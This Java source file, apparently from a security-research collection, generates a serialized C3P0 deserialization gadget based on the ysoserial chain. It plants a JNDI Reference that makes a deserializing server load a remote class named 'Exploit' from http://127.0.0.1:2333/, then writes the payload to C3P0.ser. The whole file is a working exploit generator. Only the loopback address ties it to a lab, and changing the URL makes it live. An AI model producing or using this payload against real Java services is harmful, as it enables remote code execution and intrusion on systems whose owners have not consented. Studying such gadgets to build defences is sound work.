package C3P0;

/**
 * http://www.lmxspace.com/2019/12/20/ysoserial-C3P0/
 * https://www.cnblogs.com/tr1ple/p/12608764.html
 */

import com.mchange.v2.c3p0.PoolBackedDataSource;
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

public class payload1 {
    private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {
        private String className;
        private String url;

        public PoolSource(String className, String url) {
            this.className = className;
            this.url = url;
        }

        @Override
        public Reference getReference() throws NamingException {
            return new Reference("exploit", this.className, this.url);
        }

        @Override
        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }

        @Override
        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }

        @Override
        public PrintWriter getLogWriter() throws SQLException {
            return null;
        }

        @Override
        public void setLogWriter(PrintWriter out) throws SQLException {

        }

        @Override
        public void setLoginTimeout(int seconds) throws SQLException {

        }

        @Override
        public int getLoginTimeout() throws SQLException {
            return 0;
        }

        @Override
        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }
    }
    public static void main(String[] args) throws Exception {
        Constructor con = PoolBackedDataSource.class.getDeclaredConstructor();//构造方法
        con.setAccessible(true);
        PoolBackedDataSource obj = (PoolBackedDataSource) con.newInstance();
        Field conData = PoolBackedDataSourceBase.class.getDeclaredField("connectionPoolDataSource");
        conData.setAccessible(true);
        conData.set(obj, new PoolSource("Exploit", "http://127.0.0.1:2333/"));
        ObjectOutputStream objOut = new ObjectOutputStream(new FileOutputStream("C3P0.ser"));
        objOut.writeObject(obj);
    }

}
